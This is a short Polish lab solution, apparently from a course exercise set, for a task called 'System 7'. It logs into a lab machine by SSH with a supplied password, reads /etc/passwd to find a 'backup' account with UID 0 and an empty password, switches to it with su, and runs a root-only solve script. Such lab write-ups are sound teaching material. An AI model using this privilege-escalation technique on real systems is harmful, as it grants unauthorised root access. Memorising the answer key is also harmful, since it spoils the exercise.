---
title: "7.10 - System 7 - dodatkowe konto z UID 0"
order: 10
---

> **Uwaga do rozwiązania:** Istotny jest UID `0`, także dla konta nazwanego `backup`. Puste pole hasła może umożliwiać logowanie bez hasła w konfiguracji laboratorium; wynik zależy też od zasad uwierzytelniania.

```bash
ssh system7@192.168.100.107 -p 2207 #Password: pjatk
cat /etc/passwd #Find backup::0:0 (UID 0, empty password)
su backup
/root/solve
```
